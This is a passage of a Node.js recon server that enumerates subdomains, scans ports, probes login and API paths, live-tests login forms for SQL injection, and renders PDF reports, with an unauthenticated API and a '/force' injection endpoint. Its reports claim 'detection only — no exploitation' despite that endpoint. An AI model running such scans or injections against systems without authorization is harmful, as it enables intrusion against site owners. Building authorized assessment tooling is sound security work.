    findings.push({ severity: 'info', title: 'Login surface (HTTP 200)', host: lp.host, detail: 'Authentication endpoint at ' + lp.path + (lp.formFields.length ? ' — form fields: ' + lp.formFields.join(', ') : '') + (lp.verified === false ? ' — UNVERIFIED: no response on recheck (unstable target).' : lp.verified ? ' — re-verified live.' : ''), evidence: lp.path });
  }

  for (const a of apiEndpoints) {
    findings.push({ severity: a.severity, title: 'API endpoint exposed: ' + a.path, host: a.host, detail: a.kind + ' returned HTTP 200 (' + a.size + ' bytes)' + (a.verified === false ? ' — UNVERIFIED: no response on recheck.' : a.verified ? ' — re-verified live.' : '') + '.', evidence: a.path + ' -> 200' });
  }

  for (const s of sqli) {
    const pb = s.playbook || [];
    const pbTxt = pb.length ? ' Payloads: ' + pb.map((p) => p.field + ' = ' + JSON.stringify(p.value)).join('  ·  ') : '';
    findings.push({ severity: 'high', title: 'SQL injection detected (' + s.technique + ')', host: s.host, detail: 'Parameter "' + s.param + '" at ' + s.path + ' is injectable. Evidence: ' + s.sig + '.' + pbTxt + ' Requires manual confirmation within an authorized scope.', evidence: s.param + ' = ' + s.payload });
  }

  for (const e of exposure) {
    findings.push({ severity: e.severity, title: 'Sensitive file exposed: ' + e.path, host: e.host, detail: 'Endpoint returned HTTP ' + e.status + ' (' + e.size + ' bytes) with a matching signature' + (e.verified === false ? ' — UNVERIFIED: no response on recheck.' : e.verified ? ' — re-verified live.' : '') + '.', evidence: e.path + ' -> ' + e.status });
  }

  const order = { high: 0, medium: 1, low: 2, info: 3 };
  return findings.sort((a, b) => (order[a.severity] - order[b.severity]) || a.host.localeCompare(b.host));
}

// ── PDF report ─────────────────────────────────────────────────────────────
const RED = '#c30044';
const INK = '#201f24';
const MUTED = '#6f6c76';
const LINE = '#e0dde3';
const SOFT = '#eeecef';
const SEV_COLOR = { high: '#c30044', medium: '#c2763a', low: '#b0893a', info: '#2f8fa8' };

async function buildPdf(scan) {
  const chunks = [];
  const doc = new PDFDocument({ size: 'A4', margin: 46 });
  doc.on('data', (c) => chunks.push(c));

  const W = doc.page.width, H = doc.page.height;
  const MW = W - 92;
  const MARGIN = 46;
  const BOTTOM = 56;

  // Absolute-positioned decorators must not disturb the flow cursor: doc.text(x, y)
  // advances doc.y, so each of these saves the cursor and restores it afterwards.
  const watermark = () => {
    const prevY = doc.y;
    doc.save();
    doc.fillOpacity(0.05);
    doc.rotate(-32, { origin: [W / 2, H / 2] });
    doc.font('Helvetica-Bold').fontSize(58).fillColor(RED);
    doc.text('b3n3d1ck — RECON', 0, H / 2 - 24, { width: W, align: 'center' });
    doc.restore();
    doc.y = prevY;
  };
  const footer = (label) => {
    const prevY = doc.y;
    const y = H - 34;
    doc.moveTo(MARGIN, y - 6).lineTo(W - MARGIN, y - 6).strokeColor(LINE).lineWidth(0.5).stroke();
    doc.font('Helvetica').fontSize(7).fillColor(MUTED);
    doc.text('CONFIDENTIAL — authorized security assessment', MARGIN, y, { width: MW, align: 'left' });
    doc.text(label, MARGIN, y, { width: MW, align: 'right' });
    doc.y = prevY;
  };
  const newPage = () => { doc.addPage(); watermark(); };
  const sectionTitle = (txt) => {
    if (doc.y > H - 120) newPage();
    doc.moveDown(0.4);
    doc.font('Helvetica-Bold').fontSize(15).fillColor(INK).text(txt);
    doc.moveTo(MARGIN, doc.y + 2).lineTo(W - MARGIN, doc.y + 2).strokeColor(RED).lineWidth(1.3).stroke();
    doc.moveDown(0.7);
  };

  // Punctuation-aware wrapping: break long tokens at '.', '/', '&', '=', '?', etc.
  // so hostnames and URLs never split mid-word (e.g. "mylms.telkomschools.sc" / "h.id").
  const BREAK_CHARS = new Set([' ', '.', '/', '&', '=', '?', '-', '_', ':', '%', ',']);
  const wrapText = (txt, maxWidth, font, size) => {
    doc.font(font).fontSize(size);
    const s = String(txt ?? '');
    if (doc.widthOfString(s) <= maxWidth) return [s];
    const lines = [];
    let line = '';
    for (let i = 0; i < s.length; i++) {
      const ch = s[i];
      if (doc.widthOfString(line + ch) <= maxWidth) {
        line += ch;
      } else {
        let brk = -1;
        for (let j = line.length - 1; j > 0; j--) {
          if (BREAK_CHARS.has(line[j])) { brk = j; break; }
        }
        if (brk > 0 && brk < line.length - 1) {
          lines.push(line.slice(0, brk + 1));
          line = line.slice(brk + 1) + ch;
        } else {
          lines.push(line);
          line = ch;
        }
      }
    }
    if (line) lines.push(line);
    return lines;
  };

  // Wrapping, page-break-aware table renderer.
  const drawTable = (headers, rows, colW, opts = {}) => {
    const pad = 6;
    const headerH = 20;
    const size = 7.5;
    const lineH = size + 1.6;
    const cellW = colW.map((w) => w - pad * 2);
    const cellText = (cell) => String(cell && typeof cell === 'object' ? (cell.text ?? '') : (cell ?? ''));
    const wrapped = rows.map((row) => row.map((cell, i) => wrapText(cellText(cell), cellW[i], 'Helvetica', size)));
    const drawHead = () => {
      const headY = doc.y;
      doc.rect(MARGIN, headY, MW, headerH).fill(RED);
      doc.fillColor('#ffffff').font('Helvetica-Bold').fontSize(8);
      let cx = MARGIN;
      headers.forEach((hd, i) => {
        doc.text(hd.toUpperCase(), cx + pad, headY + 7, { width: cellW[i] });
        cx += colW[i];
      });
      doc.y = headY + headerH;
    };
    drawHead();
    rows.forEach((row, ri) => {
      const lines = wrapped[ri];
      const n = Math.max(...lines.map((l) => l.length));
      const rh = Math.max(14, n * lineH + pad * 2);
      if (doc.y + rh > H - BOTTOM) { newPage(); drawHead(); }
      const rowY = doc.y;
      doc.rect(MARGIN, rowY, MW, rh).fill(ri % 2 ? SOFT : '#ffffff');
      let cx = MARGIN;
      row.forEach((cell, i) => {
        const c = cell && typeof cell === 'object' ? cell : { text: cell };
        doc.fillColor(c.__color || opts.textColor || INK).font('Helvetica').fontSize(size);
        lines[i].forEach((ln, li) => {
          doc.text(ln, cx + pad, rowY + pad + li * lineH, { width: cellW[i], lineBreak: false });
        });
        cx += colW[i];
      });
      doc.y = rowY + rh;
    });
    doc.moveDown(0.6);
  };

  // ── Cover ──
  watermark();
  doc.font('Helvetica-Bold').fontSize(42).fillColor(INK).text('SECURITY', MARGIN, 130, { characterSpacing: 1 });
  doc.font('Helvetica-Bold').fontSize(42).fillColor(RED).text('RECON REPORT', MARGIN, doc.y + 2, { characterSpacing: 1 });
  doc.moveDown(0.4);
  doc.font('Helvetica').fontSize(13).fillColor(MUTED).text('Automated reconnaissance & vulnerability detection');
  doc.moveDown(1.3);
  doc.font('Helvetica-Bold').fontSize(11).fillColor(INK).text('TARGET');
  doc.font('Helvetica-Bold').fontSize(26).fillColor(RED).text(scan.target);
  doc.moveDown(1);
  const meta = [
    ['GENERATED', new Date().toISOString().replace('T', ' ').slice(0, 19)],
    ['DURATION', scan.endedAt ? ((scan.endedAt - scan.startedAt) / 1000).toFixed(1) + 's' : '—'],
    ['ENGINE', 'recon-pipeline v1.2'],
    ['MODE', 'detection only — no exploitation'],
  ];
  meta.forEach(([k, v]) => {
    doc.font('Helvetica-Bold').fontSize(8).fillColor(MUTED).text(k);
    doc.font('Helvetica').fontSize(11).fillColor(INK).text('   ' + v);
    doc.moveDown(0.3);
  });
  doc.rect(W - 200, 130, 154, 36).fill(RED);
  doc.font('Helvetica-Bold').fontSize(12).fillColor('#ffffff').text('CONFIDENTIAL', W - 194, 142);

  // ── Summary ──
  newPage(); footer('02');
  sectionTitle('Executive Summary');
  const s = scan.summary;
  const stats = [
    ['HOSTS', s.subdomains], ['LIVE WEB', s.liveHosts], ['OPEN PORTS', s.openPorts],
    ['LOGIN 200', s.loginPages], ['API 200', s.apiEndpoints], ['FINDINGS', s.findings],
  ];
  const cw = MW / stats.length;
  const boxY = doc.y;
  stats.forEach(([k, v], i) => {
    const x = MARGIN + i * cw;
    doc.rect(x, boxY, cw - 6, 44).fill(i % 2 ? SOFT : '#f7f5f7');
    doc.font('Helvetica-Bold').fontSize(18).fillColor(RED).text(String(v), x + 12, boxY + 8, { width: cw - 18 });
    doc.font('Helvetica').fontSize(7).fillColor(MUTED).text(k, x + 12, boxY + 32, { width: cw - 18 });
  });
  doc.y = boxY + 44;
  doc.moveDown(0.8);
  const sevLine = ['high', 'medium', 'low', 'info'].map((k) => k.toUpperCase() + ' ' + (s.bySeverity?.[k] || 0)).join('   ·   ');
  doc.font('Helvetica-Bold').fontSize(10).fillColor(INK).text('Severity breakdown: ' + sevLine);
  doc.moveDown(0.4);
  doc.font('Helvetica').fontSize(9.5).fillColor(INK).text(
    'This report reflects a passive + active reconnaissance pass. Findings are detection signals that require ' +
    'manual confirmation within an authorized scope. No data exfiltration, authentication bypass, or exploitation ' +
    'was performed by this engine.', { width: MW, lineGap: 3 });

  // ── Findings ──
  newPage(); footer('03');
  sectionTitle('Vulnerability Findings');
  const fRows = (scan.results.findings || []).map((f) => [
    { text: f.severity.toUpperCase(), __color: SEV_COLOR[f.severity] },
    { text: f.title },
    { text: f.host },
    { text: f.detail },
  ]);
  if (fRows.length) drawTable(['Severity', 'Finding', 'Host', 'Detail'], fRows, [58, 140, 122, MW - 320], { colored: true });
  else doc.font('Helvetica').fontSize(10).fillColor(MUTED).text('No findings.');

  // ── Subdomains ──
  newPage(); footer('04');
  sectionTitle('Discovered Subdomains (' + (scan.results.subdomains || []).length + ')');
  const subRows = (scan.results.subdomains || []).map((h) => [{ text: h }, { text: ((scan.results.dns || []).find((d) => d.host === h)?.A || []).join(', ') || '—' }]);
  drawTable(['Host', 'A records'], subRows, [250, MW - 250]);

  // ── DNS ──
  newPage(); footer('05');
  sectionTitle('DNS Records');
  const dnsRows = (scan.results.dns || []).map((d) => {
    const rec = [];
    if (d.A) rec.push('A ' + d.A.join(','));
    if (d.AAAA) rec.push('AAAA ' + d.AAAA.join(','));
    if (d.CNAME) rec.push('CNAME ' + d.CNAME.join(','));
    if (d.MX) rec.push('MX ' + d.MX.map((m) => m.exchange).join(','));
    if (d.NS) rec.push('NS ' + d.NS.join(','));
    return [{ text: d.host }, { text: rec.join('  |  ') || '—' }];
  });
  drawTable(['Host', 'Records'], dnsRows, [190, MW - 190]);

  // ── Ports ──
  newPage(); footer('06');
  sectionTitle('Open Ports');
  const portRows = [];
  for (const [ip, list] of Object.entries(scan.results.ports || {})) {
    if (!list.length) continue;
    portRows.push([{ text: ip }, { text: list.map((p) => p.port + ' ' + p.service).join(', ') }]);
  }
  if (portRows.length) drawTable(['IP', 'Open ports'], portRows, [170, MW - 170]);
  else doc.font('Helvetica').fontSize(10).fillColor(MUTED).text('No open ports found.');

  // ── HTTP ──
  newPage(); footer('07');
  sectionTitle('HTTP Hosts (' + (scan.results.http || []).length + ')');
  const httpRows = (scan.results.http || []).map((h) => [
    { text: String(h.status), __color: h.status < 400 ? '#2f9e6a' : RED },
    { text: h.host }, { text: h.title || '—' }, { text: (h.tech || []).join(', ') },
  ]);
  if (httpRows.length) drawTable(['Status', 'Host', 'Title', 'Technology'], httpRows, [46, 150, 150, MW - 346], { colored: true });

  // ── Login pages (200) ──
  newPage(); footer('08');
  sectionTitle('Login Pages — HTTP 200 (' + (scan.results.loginPages || []).length + ')');
  const lpRows = (scan.results.loginPages || []).map((l) => [
    { text: '200' }, { text: l.host + l.path }, { text: l.formFields.join(', ') || '—' },
  ]);
  if (lpRows.length) drawTable(['Status', 'URL', 'Form fields'], lpRows, [40, 260, MW - 300]);
  else doc.font('Helvetica').fontSize(10).fillColor(MUTED).text('No HTTP-200 login pages detected.');

  // ── API endpoints (200) ──
  newPage(); footer('09');
  sectionTitle('Exposed API Endpoints — HTTP 200 (' + (scan.results.apiEndpoints || []).length + ')');
  const apiRows = (scan.results.apiEndpoints || []).map((a) => [
    { text: a.severity.toUpperCase(), __color: SEV_COLOR[a.severity] },
    { text: a.host + a.path }, { text: a.kind },
  ]);
  if (apiRows.length) drawTable(['Severity', 'URL', 'Kind'], apiRows, [64, 290, MW - 354], { colored: true });
  else doc.font('Helvetica').fontSize(10).fillColor(MUTED).text('No exposed API endpoints detected.');

  // ── SQLi detection summary ──
  newPage(); footer('10');
  sectionTitle('SQL Injection Detection');
  const sqTests = scan.results.sqliTests || [];
  const sqHits = sqTests.filter((t) => t.result === 'injectable');
  doc.font('Helvetica').fontSize(10).fillColor(INK).text(
    sqTests.length + ' probes across ' + uniq(sqTests.map((t) => t.host + t.path)).length + ' endpoints · ' +
    sqHits.length + ' injectable parameter(s).', { width: MW });
  doc.moveDown(0.5);
  if (sqHits.length) {
    const sqRows = sqHits.map((t) => [
      { text: 'HIT', __color: RED },
      { text: t.host + t.path }, { text: t.param }, { text: t.payload }, { text: t.technique },
    ]);
    drawTable(['Result', 'Endpoint', 'Param', 'Payload', 'Type'], sqRows, [40, 190, 70, 130, MW - 430], { colored: true });
  } else {
    doc.font('Helvetica-Bold').fontSize(11).fillColor('#2f9e6a').text('No SQL injection detected.');
    doc.moveDown(0.3);
    doc.font('Helvetica').fontSize(9.5).fillColor(MUTED).text(
      'Every parameter was probed for error-based disclosure and boolean true/false differentials. ' +
      'The full per-payload log is shown live in the console while scanning.');
  }

  doc.end();
  return new Promise((resolve) => {
    doc.on('end', () => resolve(Buffer.concat(chunks)));
  });
}

// ── scan orchestration ─────────────────────────────────────────────────────
async function runScan(scan) {
  const domain = scan.target;
  const log = (msg) => scan.logs.push({ t: Date.now(), msg });
  const phase = (label) => { scan.phase = label; scan.phaseIndex++; log(label); };

  try {
    phase('Enumerating subdomains (crt.sh + hackertarget + wordlist)');
    const [crt, ht] = await Promise.all([
      crtshSubdomains(domain, log),
      hackertargetSubdomains(domain, log),
    ]);
    const brute = await bruteSubdomains(domain);
    const subdomains = uniq([domain, ...crt, ...ht, ...brute]).sort();
    scan.results.subdomains = subdomains;
    scan.summary.subdomains = subdomains.length;
    log(`Discovered ${subdomains.length} unique hosts`);
    await axfrHint(domain, log);

    phase('Resolving DNS records');
    const dnsResults = await mapLimit(subdomains, 15, resolveRecords);
    scan.results.dns = dnsResults;
    const ipMap = new Map();
    for (const r of dnsResults) for (const a of r.A || []) { if (!ipMap.has(a)) ipMap.set(a, []); ipMap.get(a).push(r.host); }
    const ips = [...ipMap.keys()].slice(0, 25);

    phase(`Scanning ports on ${ips.length} unique IPs`);
    const ports = {};
    await mapLimit(ips, 8, async (ip) => {
      ports[ip] = await scanPorts(ip);
      scan.results.ports = { ...ports };
      scan.summary.openPorts = Object.values(ports).flat().length;
    });

    phase('Probing HTTP + fingerprinting');
    const hosts = subdomains.filter((h) => { const r = dnsResults.find((x) => x.host === h); return r && r.A && r.A.length; }).slice(0, 60);
    const httpResults = [];
    await mapLimit(hosts, 8, async (host) => {
      const p = await probeHttp(host);
      if (p) { httpResults.push(p); scan.results.http = [...httpResults]; }
    });
    scan.summary.liveHosts = httpResults.length;
    scan.results.live200 = httpResults.filter((x) => x.status === 200).map((x) => x.host);

    phase('Mapping login surface (HTTP 200 only)');
    const loginPages = [];
    await mapLimit(httpResults, 6, async (h) => {
      await mapLimit(LOGIN_PATHS, 5, async (p) => {
        const r = await fetchText(h.scheme + '://' + h.host + p, 7000);
        if (r.status === 200) {
          const rec = { host: h.host, scheme: h.scheme, path: p, status: 200, formFields: parseFormFields(r.text || ''), finalUrl: r.url };
          loginPages.push(rec);
          scan.results.loginPages = [...loginPages];
          log(`login 200: ${h.host}${p}${rec.formFields.length ? ' [fields: ' + rec.formFields.join(', ') + ']' : ''}`);
        }
      });
    });
    scan.summary.loginPages = loginPages.length;

    phase('Discovering exposed API endpoints (HTTP 200 only)');
    const apiEndpoints = [];
    await mapLimit(httpResults, 6, async (h) => {
      await mapLimit(API_PATHS, 6, async ([path, kind]) => {
        const r = await fetchText(h.scheme + '://' + h.host + path, 7000);
        if (r.status === 200) {
          const rec = { host: h.host, scheme: h.scheme, path, kind, status: 200, size: (r.text || '').length, severity: apiSeverity(path, r.text || '') };
          apiEndpoints.push(rec);
          scan.results.apiEndpoints = [...apiEndpoints];
          log(`api 200: ${h.host}${path} (${kind})`);
        }
      });
    });
    scan.summary.apiEndpoints = apiEndpoints.length;

    phase('Testing SQL injection (detection, live)');
    const sqli = [];
    await mapLimit(loginPages, 3, async (lp) => {
      const conf = await detectSqli(lp.host, httpResults.find((x) => x.host === lp.host)?.scheme || 'https', lp.path, lp.formFields, (t) => {
        scan.results.sqliTests = [...(scan.results.sqliTests || []), t];
      });
      for (const c of conf) { sqli.push(c); log(`SQLi ${c.technique}: ${c.host}${c.path} param=${c.param}`); }
      scan.results.sqli = [...sqli];
    });

    phase('Detecting upload forms + XSS surfaces');
    const uploadForms = [];
    const xss = [];
    await mapLimit(httpResults, 6, async (h) => {
      const ufs = await detectUploadForms(h.host, h.scheme);
      for (const f of ufs) {
        uploadForms.push(f);
        scan.results.uploadForms = [...uploadForms];
        log(`upload form: ${h.host}${f.pagePath} -> ${f.action || '(self)'} (file=${f.fileInput}, method=${f.method})`);
      }
      const xh = await detectXssSurfaces(h.host, h.scheme);
      for (const x of xh) {
        xss.push(x);
        scan.results.xss = [...xss];
        log(`XSS surface: ${h.host}${x.path} param=${x.param} (${x.technique})`);
      }
    });
    scan.results.uploadForms = uploadForms;
    scan.results.xss = xss;

    phase('Checking exposed files + building findings');
    const exposure = [];
    await mapLimit(httpResults, 6, async (h) => {
      await mapLimit(EXPOSURE_CHECKS, 4, async (c) => {
        const r = await fetchText(h.scheme + '://' + h.host + c.path, 6000);
        if (r.status === 200) {
          const ct = r.headers?.get ? r.headers.get('content-type') || '' : '';
          if (c.check(r.text || '', ct)) exposure.push({ host: h.host, scheme: h.scheme, path: c.path, status: 200, size: (r.text || '').length, severity: c.severity });
        }
      });
    });
    scan.results.exposure = exposure;

    phase('Re-verifying 200 results (liveness — browser-reachable check)');
    const recheck = async (scheme, host, path) => {
      const r = await fetchText(scheme + '://' + host + path, 5000);
      return r.status === 200;
    };
    await mapLimit(loginPages, 4, async (lp) => { lp.verified = await recheck(lp.scheme || 'https', lp.host, lp.path); });
    await mapLimit(apiEndpoints, 4, async (a) => { a.verified = await recheck(a.scheme || 'https', a.host, a.path); });
    await mapLimit(exposure, 4, async (e) => { e.verified = await recheck(e.scheme || 'https', e.host, e.path); });
    scan.results.loginPages = loginPages;
    scan.results.apiEndpoints = apiEndpoints;
    scan.results.exposure = exposure;
    log('re-verified: login ' + loginPages.filter((x) => x.verified).length + '/' + loginPages.length + ' · api ' + apiEndpoints.filter((x) => x.verified).length + '/' + apiEndpoints.length + ' · files ' + exposure.filter((x) => x.verified).length + '/' + exposure.length);

    phase('Checking email security, subdomain takeover & CORS');
    const emailSec = await checkEmailSecurity(domain);
    const takeover = await checkSubdomainTakeover(dnsResults, log);
    const cors = await checkCors(httpResults);
    scan.results.emailSecurity = emailSec;
    scan.results.takeover = takeover;
    scan.results.cors = cors;
    log(`email-security: ${emailSec.length} · takeover: ${takeover.length} · cors: ${cors.length}`);

    const order = { high: 0, medium: 1, low: 2, info: 3 };
    scan.results.findings = buildFindings(scan, httpResults, loginPages, apiEndpoints, sqli, exposure)
      .concat(emailSec, takeover, cors)
      .sort((a, b) => (order[a.severity] - order[b.severity]) || a.host.localeCompare(b.host));
    const sev = { high: 0, medium: 0, low: 0, info: 0 };
    for (const f of scan.results.findings) sev[f.severity]++;
    scan.summary.findings = scan.results.findings.length;
    scan.summary.bySeverity = sev;

    scan.status = 'done';
    scan.phase = 'Complete';
    log(`Recon complete — ${scan.summary.subdomains} hosts, ${scan.summary.liveHosts} live, ${scan.summary.openPorts} ports, ${scan.summary.loginPages} login, ${scan.summary.apiEndpoints} api, ${scan.summary.findings} findings`);
  } catch (e) {
    scan.status = 'error';
    scan.error = e.message;
    log('Error: ' + e.message);
  }
  scan.endedAt = Date.now();
}

// ── HTTP server ────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

  const url = new URL(req.url, 'http://localhost');
  const send = (code, obj) => { res.writeHead(code, { 'Content-Type': 'application/json' }); res.end(JSON.stringify(obj)); };

  if (url.pathname === '/health' && req.method === 'GET') return send(200, { ok: true, uptime: process.uptime(), scans: scans.size });

  if (url.pathname === '/api/scan' && req.method === 'POST') {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      let parsed;
      try { parsed = JSON.parse(body || '{}'); } catch { return send(400, { error: 'Invalid JSON' }); }
      const domain = normalizeTarget(parsed.target);
      if (!isValidDomain(domain)) return send(400, { error: 'Invalid target domain' });
      const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
      const scan = {
        id, target: domain, status: 'running', phase: 'Initializing', phaseIndex: 0, totalPhases: 9,
        startedAt: Date.now(), endedAt: null, error: null,
        logs: [{ t: Date.now(), msg: 'Scan started for ' + domain }],
        results: { subdomains: [], dns: [], ports: {}, http: [], live200: [], loginPages: [], apiEndpoints: [], exposure: [], sqli: [], sqliTests: [], uploadForms: [], xss: [], xssTests: [], persist: [], emailSecurity: [], takeover: [], cors: [], findings: [] },
        summary: { subdomains: 0, liveHosts: 0, openPorts: 0, loginPages: 0, apiEndpoints: 0, findings: 0, bySeverity: { high: 0, medium: 0, low: 0, info: 0 } },
      };
      if (scans.size >= MAX_SCANS) scans.delete(scans.keys().next().value);
      scans.set(id, scan);
      send(200, { scanId: id });
      runScan(scan);
    });
    return;
  }

  const m = url.pathname.match(/^\/api\/scan\/([a-z0-9]+)$/);
  if (m && req.method === 'GET') {
    const scan = scans.get(m[1]);
    if (!scan) return send(404, { error: 'Scan not found' });
    return send(200, scan);
  }

  const rp = url.pathname.match(/^\/api\/scan\/([a-z0-9]+)\/report\.pdf$/);
  if (rp && req.method === 'GET') {
    const scan = scans.get(rp[1]);
    if (!scan) return send(404, { error: 'Scan not found' });
    if (scan.status !== 'done') return send(400, { error: 'Scan not finished yet' });
    try {
      const pdf = await buildPdf(scan);
      res.writeHead(200, {
        'Content-Type': 'application/pdf',
        'Content-Disposition': 'attachment; filename="recon-' + scan.target + '.pdf"',
        'Content-Length': pdf.length,
      });
      return res.end(pdf);
    } catch (e) {
      return send(500, { error: 'PDF generation failed: ' + e.message });
    }
  }

  const fp = url.pathname.match(/^\/api\/scan\/([a-z0-9]+)\/force$/);
  if (fp && req.method === 'POST') {
    const scan = scans.get(fp[1]);
    if (!scan) return send(404, { error: 'Scan not found' });
    if (scan.status !== 'done') return send(400, { error: 'Scan not finished yet — surfaces are still being mapped' });
    if (scan.forcing) return send(409, { error: 'Force-inject already running' });
    scan.forcing = true;
    send(200, { started: true });
    runForceInject(scan).then(() => { scan.forcing = false; }).catch((e) => {
      scan.forcing = false;
      scan.logs.push({ t: Date.now(), msg: 'force-inject error: ' + e.message });
    });
    return;
  }

  send(404, { error: 'Not found' });
});

server.listen(PORT, () => console.log('recon-server listening on http://localhost:' + PORT));
